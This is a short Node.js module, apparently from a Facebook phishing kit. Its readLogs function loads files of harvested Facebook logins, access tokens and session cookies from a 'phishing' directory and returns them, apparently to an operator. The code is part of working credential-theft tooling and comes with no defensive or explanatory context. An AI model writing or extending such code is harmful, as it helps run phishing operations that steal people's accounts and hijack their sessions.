const { readFile } = require('../utils/fileUtils');

async function readLogs() {
  try {
    const fblogs = readFile('../phishing/fblogs.txt', 'utf8');
    const tokenLogs = readFile('../phishing/fbtokenlogs.txt', 'utf8');
    const cookieLogs = readFile('../phishing/fbcookielogs.txt', 'utf8');

    return { data: fblogs, token: tokenLogs, cookies: cookieLogs };
  } catch (error) {
    console.error('Error reading log files:', error);
    throw { error: 'Error reading log files.' };
  }
}

module.exports = { readLogs };
